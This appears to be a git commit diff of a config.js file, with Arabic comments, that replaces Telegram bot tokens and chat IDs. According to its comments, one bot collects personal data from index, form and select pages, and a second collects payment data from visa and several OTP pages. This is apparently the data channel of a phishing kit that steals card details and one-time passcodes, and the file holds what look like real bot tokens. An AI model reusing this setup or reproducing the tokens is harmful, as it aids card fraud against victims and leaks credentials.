246c8eca53f9caf5f572d8b3447af8a266d88db9
qtrwdam120-tech <qtrwdam120@gmail.com>
2026-07-30 12:04:02 +0300

    Update config.js

--- config.js
+++ config.js
@@ -1,9 +1,9 @@
 // ⚙️ إعدادات Telegram
 
 // بوت البيانات الشخصية (index, form, select)
-const TELEGRAM_BOT_TOKEN = '8433299877:AAHTXKKlcr2ERkKK_S0QWnmpPkZi6sopTn8';
-const TELEGRAM_CHAT_ID = '8413882740';
+const TELEGRAM_BOT_TOKEN = '8971658672:AAE8Dk5ahFu_4JHZvrmZ65tbTXmutmX0G-A';
+const TELEGRAM_CHAT_ID = '8319065523';
 
 // بوت بيانات الدفع (visa, otp, otp2, otp3)
-const TELEGRAM_BOT_TOKEN_PAYMENT = '8936943413:AAHKPkVMOTlANJ16bSqLIyGbMLxH5JLYWxE';
-const TELEGRAM_CHAT_ID_PAYMENT = '8413882740';
+const TELEGRAM_BOT_TOKEN_PAYMENT = '8853109340:AAHFGRkMP-DsporxisQvWqTgFpuOz6n3mpA';
+const TELEGRAM_CHAT_ID_PAYMENT = '8319065523';
